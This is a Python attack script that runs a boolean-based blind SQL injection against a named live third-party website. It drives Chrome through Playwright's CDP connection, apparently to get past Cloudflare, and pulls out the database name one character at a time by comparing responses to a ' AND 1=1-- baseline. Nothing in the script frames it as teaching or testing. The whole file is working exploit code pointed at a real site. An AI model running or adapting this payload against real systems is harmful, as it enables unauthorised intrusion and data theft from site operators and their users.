import asyncio
import time
from urllib.parse import urlencode
from difflib import SequenceMatcher
from playwright.async_api import async_playwright

# -------------------- CONFIG --------------------
base_url = "https://www.hostinger.com/blog/wp-content/themes/blogthemeuplift/public/js/vueapp.js"
param_name = "id"
true_payload = "' AND 1=1--"
max_length = 20
ascii_range = list(range(32, 127))
delay_between_requests = 2.5

cdp_url = "http://localhost:9222"  # Chrome CDP address

# -------------------- URL BUILDER --------------------
def make_url(payload):
    return base_url + "?" + urlencode({param_name: payload})

# -------------------- FETCH USING CDP --------------------
async def fetch_raw_response(url):
    async with async_playwright() as p:
        print(f"[→] Connecting to Chrome via CDP at {cdp_url}")
        browser = await p.chromium.connect_over_cdp(cdp_url)
        page = await browser.new_page()
        print(f"[→] Navigating to: {url}")
        try:
            resp = await page.goto(url, timeout=60000)
            if resp and resp.status != 200:
                print(f"[!] Status {resp.status} at {url}")
                content = await page.content()
                with open("debug_response.html", "w", encoding="utf-8") as f:
                    f.write(content)
                raise Exception("Non-200 status code")
            content = await page.content()
        except Exception as e:
            print(f"[!] Error fetching: {e}")
            content = ""
        await page.close()
        await browser.close()
        return content

# -------------------- DB NAME EXTRACTOR --------------------
async def extract_db_name():
    print("\n[+] Fetching baseline content (TRUE payload)...")
    baseline = await fetch_raw_response(make_url(true_payload))
    if not baseline.strip():
        print("[✘] Failed to get baseline. Pastikan tab terbuka & Cloudflare selesai.")
        return

    with open("baseline.txt", "w", encoding="utf-8") as f:
        f.write(baseline)

    db_name = ""
    print("\n[+] Starting Boolean-Based Blind SQLi...\n")

    for pos in range(1, max_length + 1):
        found = False
        for code in ascii_range:
            char = chr(code)
            payload = f"' AND ASCII(SUBSTRING((SELECT database()),{pos},1))={code}--"
            test_url = make_url(payload)
            print(f"[*] Pos {pos}: Try '{char}' ({code})")

            result = await fetch_raw_response(test_url)
            if not result.strip():
                print(f"[!] Empty response at pos {pos}, char '{char}'")
                continue

            ratio = SequenceMatcher(None, result, baseline).ratio()
            if ratio > 0.95:
                db_name += char
                print(f"[✓] Found at pos {pos}: {char}")
                found = True
                break

            await asyncio.sleep(delay_between_requests)

        if not found:
            print(f"[✓] Extraction stopped at pos {pos}. DB name so far: {db_name}")
            break

    if db_name:
        print(f"\n[✔] Final Extracted DB Name: {db_name}")
    else:
        print("\n[✘] Extraction failed. Coba lagi setelah refresh Chrome tab.")

# -------------------- RUN --------------------
if __name__ == "__main__":
    asyncio.run(extract_db_name())